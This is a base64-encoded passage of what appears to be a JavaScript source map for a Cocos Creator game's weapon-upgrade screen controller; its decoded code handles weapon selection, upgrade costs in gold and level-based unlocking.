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LEVBQUUsQ0FBQyxRQUFRLENBQUM7aUVBQ2E7SUFHbkM7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQztzRUFDa0I7SUFHeEM7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQztrRUFDYztJQUdwQztRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDO2tFQUNhO0lBR2pDO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxNQUFNLENBQUM7OERBQ1M7SUFHN0I7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLFVBQVUsQ0FBQzs2REFDUTtJQUdoQztRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsSUFBSSxDQUFDOytEQUNVO0lBRzVCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUM7NERBQ087SUFqQ1IscUJBQXFCO1FBRHpDLE9BQU87T0FDYSxxQkFBcUIsQ0FtUHpDO0lBQUQsNEJBQUM7Q0FuUEQsQUFtUEMsQ0FuUGtELEVBQUUsQ0FBQyxTQUFTLEdBbVA5RDtrQkFuUG9CLHFCQUFxQiIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQge1dvcmxkfSBmcm9tIFwiLi4vaW5mby9Xb3JsZFwiO1xyXG5pbXBvcnQgTmV0d29yayBmcm9tIFwiLi4vbmV0d29yay9OZXR3b3JrXCI7XHJcbmltcG9ydCB7TmV0d29ya0NvbmZpZ30gZnJvbSBcIi4uL2NvbmZpZy9OZXR3b3JrQ29uZmlnXCI7XHJcbmltcG9ydCB7ZXh0fSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2V4dGVuZC9FeHRlbmRcIjtcclxuaW1wb3J0IFRvYXN0IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvZXh0ZW5kL1RvYXN0XCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7RXhjZWxUYWJsZU5hbWVzfSBmcm9tIFwiLi4vY29uZmlnL0V4Y2VsVGFibGVOYW1lc1wiO1xyXG5pbXBvcnQgRmFjYWRlIGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvZmFjYWRlL0ZhY2FkZVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBXZWFwb25MYXllckNvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5SaWNoVGV4dClcclxuICAgIGZpcmVQb3dlckx2TGFiZWw6IGNjLlJpY2hUZXh0ID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuUmljaFRleHQpXHJcbiAgICBwb3dlckx2TGFiZWw6IGNjLlJpY2hUZXh0ID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuUmljaFRleHQpXHJcbiAgICBmaXJlUG93ZXJDb3N0TGFiZWw6IGNjLlJpY2hUZXh0ID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuUmljaFRleHQpXHJcbiAgICBwb3dlckNvc3RMYWJlbDogY2MuUmljaFRleHQgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5SaWNoVGV4dClcclxuICAgIGZpcmVQb3dlcldvcnRoTGFiZWw6IGNjLlJpY2hUZXh0ID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuUmljaFRleHQpXHJcbiAgICBwb3dlcldvcnRoTGFiZWw6IGNjLlJpY2hUZXh0ID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuQnV0dG9uKVxyXG4gICAgZmlyZVBvd2VyQnV0dG9uOmNjLkJ1dHRvbiA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLkJ1dHRvbilcclxuICAgIHBvd2VyQnV0dG9uOmNjLkJ1dHRvbiA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLlNjcm9sbFZpZXcpXHJcbiAgICBzY3JvbGxWaWV3OmNjLlNjcm9sbFZpZXcgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgdXBFZmZlY3ROb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgdHJpYWxOb2RlOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIHdlYXBvbkJ1dHRvbnM6W2NjLkJ1dHRvbl0gPSBbXTtcclxuXHJcbiAgICBwcml2YXRlIF93ZWFwb25Gb2N1cyA9IC0xO1xyXG5cclxuICAgIGZvY3VzR3VuSUQoKXtcclxuICAgICAgICByZXR1cm4gdGhpcy5fb3JkZXJzW3RoaXMuX3dlYXBvbkZvY3VzXVsnaWQnXTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgc2V0IHdlYXBvbkZvY3VzKHZhbHVlOiBudW1iZXIpIHtcclxuICAgICAgICBpZiAodGhpcy5fd2VhcG9uRm9jdXMgIT0gdmFsdWUpe1xyXG4gICAgICAgICAgICB0aGlzLnVwRWZmZWN0Tm9kZS5yZW1vdmVGcm9tUGFyZW50KGZhbHNlKTtcclxuICAgICAgICAgICAgdGhpcy53ZWFwb25CdXR0b25zW3ZhbHVlXS5ub2RlLmFkZENoaWxkKHRoaXMudXBFZmZlY3ROb2RlKTtcclxuICAgICAgICAgICAgdGhpcy5fd2VhcG9uRm9jdXMgPSB2YWx1ZTtcclxuICAgICAgICAgICAgdGhpcy53ZWFwb25CdXR0b25zLmZvckVhY2goKHZhbHVlLCBpbmRleCkgPT4gdmFsdWUudGFyZ2V0LmdldENvbXBvbmVudChjYy5TcHJpdGUpLmVuYWJsZWQgPSBpbmRleCA9PSB0aGlzLl93ZWFwb25Gb2N1cyk7XHJcbiAgICAgICAgICAgIHRoaXMudXBkYXRlV2VhcG9uQXR0cigpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICB1cGRhdGVXZWFwb25BdHRyKCl7XHJcbiAgICAgICAgdGhpcy51cGRhdGVGaXJlUG93ZXIoKTtcclxuICAgICAgICB0aGlzLnVwZGF0ZVBvd2VyKCk7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBfb3JkZXJzID0gW107XHJcblxyXG4gICAgb25Mb2FkICgpIHtcclxuICAgICAgICB0aGlzLnRyaWFsTm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLndlYXBvbkJ1dHRvbnMgPSB0aGlzLnNjcm9sbFZpZXcuY29udGVudC5jaGlsZHJlbi5tYXAodmFsdWUgPT4gdmFsdWUuZ2V0Q29tcG9uZW50KGNjLkJ1dHRvbikpO1xyXG4gICAgICAgIGxldCBjb25maWcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5XZWFwb24pO1xyXG4gICAgICAgIHRoaXMuX29yZGVycyA9IGNvbmZpZy5maWx0ZXIodmFsdWUgPT4gdmFsdWVbJ2lkJ10gIT0gMSkuc29ydCgoKGEsIGIpID0+IHtcclxuICAgICAgICAgICAgcmV0dXJuIGFbJ29yZGVyJ10gLSBiWydvcmRlciddO1xyXG4gICAgICAgIH0pKTtcclxuICAgICAgICB0aGlzLndlYXBvbkJ1dHRvbnMuZm9yRWFjaCh2YWx1ZSA9PiB7XHJcbiAgICAgICAgICAgIGxldCBpZCA9IHBhcnNlSW50KHZhbHVlLm5vZGUubmFtZSk7XHJcbiAgICAgICAgICAgIGxldCBjZmcgPSB0aGlzLl9vcmRlcnNbaWQtMl07XHJcbiAgICAgICAgICAgIHZhbHVlLm5vZGUuZ2V0Q2hpbGRCeU5hbWUoXCJCYWNrZ3JvdW5kXCIpLmdldENoaWxkQnlOYW1lKFwiTGFiZWxcIikuZ2V0Q29tcG9uZW50KGNjLkxhYmVsKS5zdHJpbmcgPSBjZmdbJ2d1bl9uYW1lJ107XHJcbiAgICAgICAgICAgIC8vIGxldCB3ZWFwb25Ta2UgPSB2YWx1ZS5ub2RlLmdldENoaWxkQnlOYW1lKFwiQmFja2dyb3VuZFwiKS5nZXRDaGlsZEJ5TmFtZShcIndlYXBvblwiKS5nZXRDb21wb25lbnQoc3AuU2tlbGV0b24pO1xyXG4gICAgICAgICAgICAvLyB3ZWFwb25Ta2Uuc2V0U2tpbigoXCIwMDBcIitjZmdbJ2lkJ10pLnN1YnN0cigtMykpO1xyXG4gICAgICAgICAgICAvLyB3ZWFwb25Ta2Uuc2V0QW5pbWF0aW9uKDAsIFwiZ3VuXCIsIGZhbHNlKTtcclxuICAgICAgICAgICAgdmFsdWUubm9kZS5nZXRDaGlsZEJ5TmFtZShcIkJhY2tncm91bmRcIikuZ2V0Q2hpbGRCeU5hbWUoXCJ3ZWFwb25cIikuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgICAgIGxldCBzcHJpdGUgPSB2YWx1ZS5ub2RlLmdldENoaWxkQnlOYW1lKFwiQmFja2dyb3VuZFwiKS5nZXRDaGlsZEJ5TmFtZShcIndlYXBvblNwcml0ZVwiKS5nZXRDb21wb25lbnQoY2MuU3ByaXRlKTtcclxuICAgICAgICAgICAgbGV0IGJMb2NrID0gV29ybGQuU3RvcmFnZS5nYW1lTGV2ZWwgPCBjZmdbJ3VubG9jayddO1xyXG4gICAgICAgICAgICBzcHJpdGUuc2V0TWF0ZXJpYWwoMCwgY2MuTWF0ZXJpYWwuZ2V0QnVpbHRpbk1hdGVyaWFsKGJMb2NrP1wiMmQtZ3JheS1zcHJpdGVcIjpcIjJkLXNwcml0ZVwiKSk7XHJcbiAgICAgICAgICAgIHNwcml0ZS5ub2RlLm9wYWNpdHkgPSBiTG9jaz8xMjg6MjU1O1xyXG4gICAgICAgIH0pO1xyXG4gICAgICAgIGNjLmZpbmQoJ0NhbnZhcycpLm9uKFwiVXBkYXRlU3RvcmFnZVwiLCB0aGlzLm9uVXBkYXRlU3RvcmFnZUV2ZW50LCB0aGlzKTtcclxuICAgIH1cclxuXHJcbiAgICBzdGFydCgpe1xyXG4gICAgICAgIC8qKiDpgInkuK3mnIDmlrDop6PplIHnmoTmrablmaggKi9cclxuICAgICAgICBsZXQgbnVtID0gMDtcclxuICAgICAgICBmb3IgKGxldCBpdGVtIG9mIHRoaXMuX29yZGVycyl7XHJcbiAgICAgICAgICAgIGlmIChXb3JsZC5TdG9yYWdlLmdhbWVMZXZlbCA+PSBpdGVtWyd1bmxvY2snXSl7XHJcbiAgICAgICAgICAgICAgICBudW0rKztcclxuICAgICAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICAgICAgYnJlYWs7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGlmIChudW0gPD0gMyl7XHJcbiAgICAgICAgICAgIHRoaXMuc2Nyb2xsVmlldy5zY3JvbGxUb0xlZnQoKTtcclxuICAgICAgICB9ZWxzZSBpZiAobnVtID49IHRoaXMuX29yZGVycy5sZW5ndGggLSAxKXtcclxuICAgICAgICAgICAgdGhpcy5zY3JvbGxWaWV3LnNjcm9sbFRvUmlnaHQoKTtcclxuICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICBsZXQgeCA9IChudW0tMykgKiB0aGlzLndlYXBvbkJ1dHRvbnNbMF0ubm9kZS53aWR0aDtcclxuICAgICAgICAgICAgdGhpcy5zY3JvbGxWaWV3LnNjcm9sbFRvT2Zmc2V0KGNjLnYyKHgsIHRoaXMuc2Nyb2xsVmlldy5jb250ZW50LnkpKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy53ZWFwb25Gb2N1cyA9IG51bS0xO1xyXG4gICAgICAgIGlmIChXb3JsZC5TdG9yYWdlLnVubG9ja0d1biA+IDApe1xyXG4gICAgICAgICAgICBsZXQgaW5kZXggPSB0aGlzLl9vcmRlcnMuZmluZEluZGV4KHZhbHVlID0+IHZhbHVlWydpZCddID09IFdvcmxkLlN0b3JhZ2UudW5sb2NrR3VuKTtcclxuICAgICAgICAgICAgaWYgKHR5cGVvZiBpbmRleCA9PSBcInVuZGVmaW5lZFwiKXtcclxuICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoXCJub3QgZm91bmQgZ3VuIGZvciBpZD09PT5cIiwgV29ybGQuU3RvcmFnZS51bmxvY2tHdW4pO1xyXG4gICAgICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnRyaWFsTm9kZS5yZW1vdmVGcm9tUGFyZW50KGZhbHNlKTtcclxuICAgICAgICAgICAgICAgIHRoaXMudHJpYWxOb2RlLmFjdGl2ZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICB0aGlzLndlYXBvbkJ1dHRvbnNbaW5kZXhdLm5vZGUuYWRkQ2hpbGQodGhpcy50cmlhbE5vZGUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIG9uRGVzdHJveSgpe1xyXG4gICAgICAgIGNjLmZpbmQoJ0NhbnZhcycpLm9mZihcIlVwZGF0ZVN0b3JhZ2VcIiwgdGhpcy5vblVwZGF0ZVN0b3JhZ2VFdmVudCwgdGhpcyk7XHJcbiAgICB9XHJcblxyXG4gICAgb25VcGRhdGVTdG9yYWdlRXZlbnQoa2V5OnN0cmluZyl7XHJcbiAgICAgICAgaWYgKGtleSA9PSBcImdvbGRDb3VudFwiKXtcclxuICAgICAgICAgICAgbGV0IGNmZyA9IHRoaXMuX29yZGVyc1t0aGlzLl93ZWFwb25Gb2N1c107XHJcbiAgICAgICAgICAgIGxldCBpZCA9IGNmZ1snaWQnXTtcclxuICAgICAgICAgICAgbGV0IGZpcmVQb3dlckx2ID0gV29ybGQuTXkuYXJtb3J5LmxldmVsT2ZFbWl0dGVyRmlyZVBvd2VyKGlkKTtcclxuICAgICAgICAgICAgaWYgKGZpcmVQb3dlckx2IDwgY2ZnWydsdl9saW1pdCddKXtcclxuICAgICAgICAgICAgICAgIGxldCBuZWVkQ29zdCA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvblVwKVtmaXJlUG93ZXJMdi0xXVsnZmlyZV9leHBlbmQnXTtcclxuICAgICAgICAgICAgICAgIHRoaXMuZmlyZVBvd2VyQnV0dG9uLmludGVyYWN0YWJsZSA9IFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50ID49IG5lZWRDb3N0O1xyXG4gICAgICAgICAgICAgICAgdGhpcy5maXJlUG93ZXJDb3N0TGFiZWwubm9kZS5jb2xvciA9IHRoaXMuZmlyZVBvd2VyQnV0dG9uLmludGVyYWN0YWJsZT9jYy5Db2xvci5XSElURTpjYy5Db2xvci5SRUQuZnJvbUhFWChcIiM5MjQzMzhcIik7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgbGV0IHBvd2VyTHYgPSBXb3JsZC5NeS5hcm1vcnkubGV2ZWxPZkVtaXR0ZXJQb3dlcihpZCk7XHJcbiAgICAgICAgICAgIGlmIChwb3dlckx2IDwgY2ZnWydsdl9saW1pdCddKXtcclxuICAgICAgICAgICAgICAgIGxldCBuZWVkQ29zdCA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLldlYXBvblVwKVtwb3dlckx2LTFdWydwb3dlcl9leHBlbmQnXTtcclxuICAgICAgICAgICAgICAgIHRoaXMucG93ZXJCdXR0b24uaW50ZXJhY3RhYmxlID0gV29ybGQuU3RvcmFnZS5nb2xkQ291bnQgPj0gbmVlZENvc3Q7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnBvd2VyQ29zdExhYmVsLm5vZGUuY29sb3IgPSB0aGlzLnBvd2VyQnV0dG9uLmludGVyYWN0YWJsZT9jYy5Db2xvci5XSElURTpjYy5Db2xvci5SRUQuZnJvbUhFWChcIiM5MjQzMzhcIik7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgdXBkYXRlRmlyZVBvd2VyKCl7XHJcbiAgICAgICAgbGV0IGNmZyA9IHRoaXMuX29yZGVyc1t0aGlzLl93ZWFwb25Gb2N1c107XHJcbiAgICAgICAgbGV0IGlkID0gY2ZnWydpZCddO1xyXG4gICAgICAgIGxldCBmaXJlUG93ZXJMdiA9IFdvcmxkLk15LmFybW9yeS5sZXZlbE9mRW1pdHRlckZpcmVQb3dlcihpZCk7XHJcbiAgICAgICAgdGhpcy5maXJlUG93ZXJMdkxhYmVsLnN0cmluZyA9IGA8Yj48b3V0bGluZSBjb2xvcj0jMWUxZTFlIHdpZHRoPTQ+5by56YePIFtMdi4ke2ZpcmVQb3dlckx2fV08L291dGxpbmU+PC9iPmA7XHJcbiAgICAgICAgaWYgKGZpcmVQb3dlckx2ID49IGNmZ1snbHZfbGltaXQnXSl7XHJcbiAgICAgICAgICAgIHRoaXMuZmlyZVBvd2VyQ29zdExhYmVsLnN0cmluZyA9IGA8Yj48b3V0bGluZSBjb2xvcj0jMWUxZTFlIHdpZHRoPTM+5ruh57qnPC9vdXRsaW5lPjwvYj5gO1xyXG4gICAgICAgICAgICB0aGlzLmZpcmVQb3dlckJ1dHRvbi5pbnRlcmFjdGFibGUgPSBmYWxzZTtcclxuICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICBsZXQgbmVlZENvc3QgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5XZWFwb25VcClbZmlyZVBvd2VyTHYtMV1bJ2ZpcmVfZXhwZW5kJ107XHJcbiAgICAgICAgICAgIHRoaXMuZmlyZVBvd2VyQ29zdExhYmVsLnN0cmluZyA9IGA8Yj48b3V0bGluZSBjb2xvcj0jMWUxZTFlIHdpZHRoPTM+JHtleHQuc2hvcnRGb3JtYXQobmVlZENvc3QpfTwvb3V0bGluZT48L2I+YDtcclxuICAgICAgICAgICAgdGhpcy5maXJlUG93ZXJCdXR0b24uaW50ZXJhY3RhYmxlID0gV29ybGQuU3RvcmFnZS5nb2xkQ291bnQgPj0gbmVlZENvc3Q7XHJcbiAgICAgICAgfVxyXG4gICAgICAgIHRoaXMuZmlyZVBvd2VyQ29zdExhYmVsLm5vZGUuY29sb3IgPSB0aGlzLmZpcmVQb3dlckJ1dHRvbi5pbnRlcmFjdGFibGU/Y2MuQ29sb3IuV0hJVEU6Y2MuQ29sb3IuUkVELmZyb21IRVgoXCIjOTI0MzM4XCIpO1xyXG4gICAgICAgIHRoaXMuZmlyZVBvd2VyV29ydGhMYWJlbC5zdHJpbmcgPSBgPGI+PG91dGxpbmUgY29sb3I9IzFlMWUxZSB3aWR0aD0zPiR7ZXh0LnNob3J0Rm9ybWF0KFdvcmxkLk15LmFybW9yeS5wYXlsb2FkQWRkT2YoaWQpKX08L291dGxpbmU+PC9iPmA7XHJcbiAgICB9XHJcblxyXG4gICAgdXBkYXRlUG93ZXIoKXtcclxuICAgICAgICBsZXQgY2ZnID0gdGhpcy5fb3JkZXJzW3RoaXMuX3dlYXBvbkZvY3VzXTtcclxuICAgICAgICBsZXQgaWQgPSBjZmdbJ2lkJ107XHJcbiAgICAgICAgbGV0IHBvd2VyTHYgPSBXb3JsZC5NeS5hcm1vcnkubGV2ZWxPZkVtaXR0ZXJQb3dlcihpZCk7XHJcbiAgICAgICAgdGhpcy5wb3dlckx2TGFiZWwuc3RyaW5nID0gYDxiPjxvdXRsaW5lIGNvbG9yPSMxZTFlMWUgd2lkdGg9ND7ngavlipsgW0x2LiR7cG93ZXJMdn1dPC9vdXRsaW5lPjwvYj5gO1xyXG4gICAgICAgIGlmIChwb3dlckx2ID49IGNmZ1snbHZfbGltaXQnXSl7XHJcbiAgICAgICAgICAgIHRoaXMucG93ZXJDb3N0TGFiZWwuc3RyaW5nID0gYDxiPjxvdXRsaW5lIGNvbG9yPSMxZTFlMWUgd2lkdGg9Mz7mu6Hnuqc8L291dGxpbmU+PC9iPmA7XHJcbiAgICAgICAgICAgIHRoaXMucG93ZXJCdXR0b24uaW50ZXJhY3RhYmxlID0gZmFsc2U7XHJcbiAgICAgICAgfWVsc2Uge1xyXG4gICAgICAgICAgICBsZXQgbmVlZENvc3QgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5XZWFwb25VcClbcG93ZXJMdi0xXVsncG93ZXJfZXhwZW5kJ107XHJcbiAgICAgICAgICAgIHRoaXMucG93ZXJDb3N0TGFiZWwuc3RyaW5nID0gYDxiPjxvdXRsaW5lIGNvbG9yPSMxZTFlMWUgd2lkdGg9Mz4ke2V4dC5zaG9ydEZvcm1hdChuZWVkQ29zdCl9PC9vdXRsaW5lPjwvYj5gO1xyXG4gICAgICAgICAgICB0aGlzLnBvd2VyQnV0dG9uLmludGVyYWN0YWJsZSA9IFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50ID49IG5lZWRDb3N0O1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLnBvd2VyQ29zdExhYmVsLm5vZGUuY29sb3IgPSB0aGlzLnBvd2VyQnV0dG9uLmludGVyYWN0YWJsZT9jYy5Db2xvci5XSElURTpjYy5Db2xvci5SRUQuZnJvbUhFWChcIiM5MjQzMzhcIik7XHJcbiAgICAgICAgbGV0IGh1cnRfYWRkID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuV2VhcG9uVXApW3Bvd2VyTHYtMV1bJ2h1cnRfYWRkJ107XHJcbiAgICAgICAgdGhpcy5wb3dlcldvcnRoTGFiZWwuc3RyaW5nID0gYDxiPjxvdXRsaW5lIGNvbG9yPSMxZTFlMWUgd2lkdGg9Mz4ke01hdGguZmxvb3IoaHVydF9hZGQqMTAwKX0lPC9vdXRsaW5lPjwvYj5gO1xyXG4gICAgfVxyXG5cclxuICAgIG9uQ2xpY2tXZWFwb24oZXZlbnQsIGRhdGEpe1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwi44CQY2xpY2vjgJFXZWFwb25MYXllckNvbnRyb2xsZXIgV2VhcG9uXCIpXHJcblxyXG4gICAgICAgIGRhdGEgPSBwYXJzZUludChkYXRhKTtcclxuICAgICAgICBsZXQgY2ZnID0gdGhpcy5fb3JkZXJzW2RhdGEtMl07XHJcbiAgICAgICAgbGV0IGJMb2NrID0gV29ybGQuU3RvcmFnZS5nYW1lTGV2ZWwgPCBjZmdbJ3VubG9jayddO1xyXG4gICAgICAgIGlmIChiTG9jayl7XHJcbiAgICAgICAgICAgIFRvYXN0LmZsdXR0ZXIoe3N0cmluZzpgPGNvbG9yPSNmYWZmZmY+PGI+PG91dGxpbmUgY29sb3I9IzFlMWUxZSB3aWR0aD00PuesrCR7Y2ZnWyd1bmxvY2snXX3lhbPop6PplIHor6Xmrablmag8L291dGxpbmU+PC9iPjwvY29sb3I+YCwgZm9udFNpemU6MzAsIHk6Y2MudmlzaWJsZVJlY3QuY2VudGVyLnl9KTtcclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIHRoaXMud2VhcG9uQnV0dG9uc1t0aGlzLl93ZWFwb25Gb2N1c10ubm9kZS5nZXRDaGlsZEJ5TmFtZShcIkJhY2tncm91bmRcIikuZ2V0Q2hpbGRCeU5hbWUoXCJ3ZWFwb25TcHJpdGVcIikuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgdGhpcy53ZWFwb25CdXR0b25zW3RoaXMuX3dlYXBvbkZvY3VzXS5ub2RlLmdldENoaWxkQnlOYW1lKFwiQmFja2dyb3VuZFwiKS5nZXRDaGlsZEJ5TmFtZShcIndlYXBvblwiKS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICAgICAgdGhpcy53ZWFwb25Gb2N1cyA9IGRhdGEgLSAyO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBvbkNsaWNrVXBXZWFwb25GaXJlUG93ZXIoZXZlbnQsIGRhdGEpe1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwi44CQY2xpY2vjgJFXZWFwb25MYXllckNvbnRyb2xsZXIgVXBXZWFwb25GaXJlUG93ZXJcIilcclxuXHJcbiAgICAgICAgbGV0IGNmZyA9IHRoaXMuX29yZGVyc1t0aGlzLl93ZWFwb25Gb2N1c107XHJcbiAgICAgICAgbGV0IGlkID0gY2ZnWydpZCddO1xyXG4gICAgI